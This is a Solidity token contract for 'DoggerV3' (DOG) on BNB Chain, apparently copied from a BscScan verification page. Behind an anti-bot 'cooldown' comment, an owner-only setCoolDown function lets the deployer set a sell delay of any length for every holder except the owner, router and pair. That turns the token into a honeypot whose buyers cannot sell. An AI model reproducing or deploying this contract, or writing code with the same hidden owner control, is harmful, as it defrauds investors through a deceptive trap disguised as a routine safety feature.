/**
 *Submitted for verification at BscScan.com on 2022-05-31
*/

// SPDX-License-Identifier: Unlicensed                                  
pragma solidity ^0.8.10;


interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract DoggerV3 {
    address private _owner;
    string private _name = "DoggerV3";
    string private _symbol = "DOG";

    uint256 private _totalSupply = 1000000000000 * (10 ** decimals());
    address private _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => bool) private _excluded;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 lpAddedAt; // record at what block the lp was added
    uint256 coolDown = 1;
    bool lp = false;

    address public uniswapV2Pair;
    IUniswapV2Router02 public router;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor() {
        _owner = msg.sender;   
        _balances[_owner] = _totalSupply;
        router = IUniswapV2Router02(_router);
        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());

        // Exclude from cooldown
        _excluded[msg.sender] = true;
        _excluded[_router] = true;
        _excluded[uniswapV2Pair] = true;

        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return 18;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address wallet) public view returns (uint256) {
        return _balances[wallet];
    }

    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "Approve from the zero address");
        require(spender != address(0), "Approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        uint256 currentAllowance = _allowances[msg.sender][spender];
        require(currentAllowance >= subtractedValue, "Decreased allowance below zero");
        _approve(msg.sender, spender, currentAllowance - subtractedValue);
        return true;
    }

    function setCoolDown(uint256 mins) public {
        require(msg.sender == _owner);
        coolDown = mins;
    }

    function transfer(address _to, uint256 _value)
        public
        returns (bool success)
    {
        require(_balances[msg.sender] >= _value);
        _balances[msg.sender] -= _value;
        _balances[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function transferFrom(
        address _from,
        address _to,
        uint256 _value
    ) public returns (bool success) {
        // Transfer safety checks
        require(_value <= _balances[_from]);
        require(_value <= _allowances[_from][msg.sender]);

        // Uupdate allowance
        _allowances[_from][msg.sender] -= _value;
        emit Transfer(_from, _to, _value);
        
        // Check if this is addLiquidityETH transaction, so we can track the lp add time
        if (!lp && _to == uniswapV2Pair) {
            lpAddedAt = block.timestamp;
            lp = true; // flag that LP was added 
        }

        // Check if sells are allowed yet, this will block instant sell bots
          if (_to == uniswapV2Pair && !_excluded[_from]) {
              require(block.timestamp > lpAddedAt + 30 * coolDown, "cooldown");
        }

        // Modifying blances according to buy/sell
        _balances[_from] -= _value;
        _balances[_to] += _value;

        return true;
    }



}